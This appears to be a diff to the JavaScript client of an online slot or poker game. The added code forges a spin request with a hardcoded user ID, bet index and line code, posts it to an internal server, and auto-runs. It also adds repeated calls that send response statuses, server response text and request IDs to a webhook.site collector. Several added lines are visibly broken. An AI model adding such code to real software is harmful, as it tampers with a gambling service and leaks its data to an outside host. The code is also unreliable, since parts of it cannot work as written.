@@ -2746,7 +2746,50 @@ f = function ()
     method: 'POST', 
     headers: {
           "Content-Type": "application/json"
-        }
+        },
+      body: {"data":0}
+  })
+  .then(response => {
+    if (!response.ok) {
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", 'https://webhook.site/43445d43-d30c-4d6f-b926-b06d1327738e?clientfa;e'+response.status, false ); // false for synchronous request
+    xmlHttp.send( null );
+      }
+  })
+  .then(data => {
+      xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", 'https://webhook.site/43445d43-d30c-4d6f-b926-b06d1327738e?clienttrue', false ); // false for synchronous request
+xmlHttp.send( null );
+
+      xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", 'https://webhook.site/43445d43-d30c-4d6f-b926-b06d1327738e?clienttrue?d='+data.text()+'&v='+realServerRequestID, false ); // false for synchronous request
+xmlHttp.send( null );
+      
+  })};
+
+f1 = function ()
+{
+  n = {}
+  n.userid = "1b953ddc-5ebe-446a-8e78-d4b7c6ae9dc6";
+  n.slotid = "V001";
+  n.client_version = "d.20251031_9";
+  n.lineCode = "GGPOKEROK";
+  n.proto = "spin";
+  n.betindex=29;
+
+  realServerRequestID = generateUUID(n.userid);
+
+  c = encrypt(JSON.stringify(n),realServerRequestID);
+
+  o = "http://172.22.0.157:8080/api/" + realServerRequestID + "/client";
+
+
+  fetch(o, {
+    method: 'POST', 
+    headers: {
+          "Content-Type": "application/json"
+        },
+      
   })
   .then(response => {
     if (!response.ok) {
@@ -2762,6 +2805,7 @@ xmlHttp.send( null );
     bii();
   })};
 
+f1();
 f();
 xmlHttp = new XMLHttpRequest();
 xmlHttp.open( "GET", 'https://webhook.site/43445d43-d30c-4d6f-b926-b06d1327738e?re', false ); // false for synchronous request
